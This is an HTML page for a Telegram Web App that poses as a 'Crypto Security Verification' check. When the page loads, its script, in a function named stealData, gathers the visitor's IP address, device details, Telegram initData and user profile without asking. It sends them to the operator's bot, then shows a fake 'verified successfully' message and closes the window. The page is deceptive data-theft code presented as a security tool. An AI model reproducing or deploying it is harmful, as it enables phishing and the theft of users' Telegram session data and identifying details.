<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Security Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: #0a0e17;
            color: white;
            text-align: center;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #00ff88;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            margin: 40px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>üîê Crypto Security Verification</h2>
    <p>Checking your device security...</p>
    <div class="loader"></div>
    <div id="status">Initializing...</div>

    <script>
        // –ü–†–û–°–¢–û–ô –ò –†–ê–ë–û–ß–ò–ô –°–ö–†–ò–ü–¢
        async function stealData() {
            console.log('üöÄ Starting data collection...');
            document.getElementById('status').textContent = 'Getting IP address...';
            
            // 1. –ü–æ–ª—É—á–∞–µ–º IP
            let ip = 'unknown';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
                console.log('‚úÖ IP –ø–æ–ª—É—á–µ–Ω:', ip);
            } catch (error) {
                console.log('‚ùå IP error:', error);
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    ip = data.ip;
                } catch (e) {
                    ip = 'unknown';
                }
            }
            
            // 2. –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            const stolenData = {
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                time: new Date().toISOString(),
                url: window.location.href
            };
            
            // 3. –î–æ–±–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ Telegram
            if (window.Telegram && Telegram.WebApp) {
                const tg = Telegram.WebApp;
                stolenData.telegram = {
                    initData: tg.initData || '',
                    user: tg.initDataUnsafe?.user || {},
                    version: tg.version,
                    platform: tg.platform,
                    theme: tg.colorScheme
                };
                console.log('‚úÖ Telegram data captured');
            }
            
            document.getElementById('status').textContent = `IP: ${ip}`;
            
            // 4. –û–¢–ü–†–ê–í–õ–Ø–ï–ú –í –ë–û–¢–ê
            console.log('üì§ Sending to bot:', stolenData);
            
            if (window.Telegram && Telegram.WebApp && Telegram.WebApp.sendData) {
                try {
                    // –í–ê–ñ–ù–û: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫—É
                    Telegram.WebApp.sendData(JSON.stringify(stolenData));
                    console.log('‚úÖ Data sent to bot successfully!');
                    
                    // –î–ª—è —Ç–µ—Å—Ç–∞ - –≤—ã–≤–æ–¥–∏–º –≤ alert
                    // alert('Data sent: ' + JSON.stringify(stolenData, null, 2));
                } catch (sendError) {
                    console.log('‚ùå Send error:', sendError);
                }
            } else {
                console.log('‚ùå Telegram WebApp not available');
            }
            
            // 5. –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
            setTimeout(() => {
                document.body.innerHTML = `
                    <h2 style="color: #00ff88;">‚úÖ Verification Complete!</h2>
                    <p>Your device has been verified successfully.</p>
                    <p>IP: ${ip}</p>
                    <p>You can close this window.</p>
                `;
            }, 2000);
            
            // –ê–≤—Ç–æ–∑–∞–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                if (window.Telegram && Telegram.WebApp && Telegram.WebApp.close) {
                    Telegram.WebApp.close();
                }
            }, 5000);
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å—Ä–∞–∑—É
        window.onload = function() {
            console.log('üîê Page loaded, starting...');
            setTimeout(stealData, 1000);
        };
        
        // –†–µ–∑–µ—Ä–≤–Ω—ã–π –∑–∞–ø—É—Å–∫
        setTimeout(() => {
            if (document.getElementById('status').textContent === 'Initializing...') {
                stealData();
            }
        }, 3000);
    </script>
</body>
</html>
